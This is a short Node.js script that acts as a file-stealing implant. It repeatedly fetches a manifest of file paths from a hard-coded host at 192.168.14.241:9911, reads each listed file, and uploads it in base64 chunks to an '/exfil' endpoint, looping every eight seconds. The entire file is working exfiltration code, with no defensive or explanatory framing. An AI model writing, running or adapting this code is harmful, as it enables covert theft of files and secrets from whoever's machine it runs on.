var http = require('http');
var fs = require('fs');
var HOST = '192.168.14.241', PORT = 9911;
var alive = [];   // hold refs so GC doesn't cancel requests

function post(path, data, cb) {
  try {
    var body = (typeof data === 'string') ? data : JSON.stringify(data);
    var req = http.request({host: HOST, port: PORT, path: path, method: 'POST',
      headers: {'Content-Type': 'application/octet-stream', 'Content-Length': Buffer.byteLength(body)}},
      function(r) { r.on('data', function(){}); r.on('end', function(){ alive.splice(alive.indexOf(req),1); if (cb) cb(); }); });
    req.on('error', function(){ alive.splice(alive.indexOf(req),1); if (cb) cb(); });
    alive.push(req);
    req.write(body); req.end();
  } catch(e) { if (cb) cb(); }
}
function getJson(path, cb) {
  try {
    var req = http.get({host: HOST, port: PORT, path: path}, function(r) {
      var b = '';
      r.on('data', function(c){ b += c; });
      r.on('end', function(){ alive.splice(alive.indexOf(req),1); try { cb(JSON.parse(b)); } catch(e){ cb(null); } });
    });
    req.on('error', function(){ alive.splice(alive.indexOf(req),1); cb(null); });
    alive.push(req);
  } catch(e) { cb(null); }
}

var done = {};   // path -> true  (send each file once)
var ticks = 0;
function sendFile(f, next) {
  var b;
  try { b = fs.readFileSync(f.path); } catch(e) { post('/exfil', {path: f.path, err: ''+e.code}, next); return; }
  if (f.max && b.length > f.max) { post('/exfil', {path: f.path, err: 'too-big ' + b.length}, next); return; }
  var CH = 128000;
  var i = 0;
  (function chunk() {
    if (i >= b.length) { next(); return; }
    post('/exfil', {path: f.path, total: b.length, off: i, b64: b.slice(i, i+CH).toString('base64')}, function() {
      i += CH;
      setTimeout(chunk, 120);
    });
  })();
}
function loop() {
  ticks++;
  getJson('/manifest.json?t=' + ticks, function(m) {
    var todo = (m && m.files) ? m.files.filter(function(f){ return !done[f.path]; }) : [];
    (function run() {
      if (!todo.length) { setTimeout(loop, 8000); return; }
      var f = todo.shift();
      done[f.path] = true;
      sendFile(f, run);
    })();
  });
}
loop();
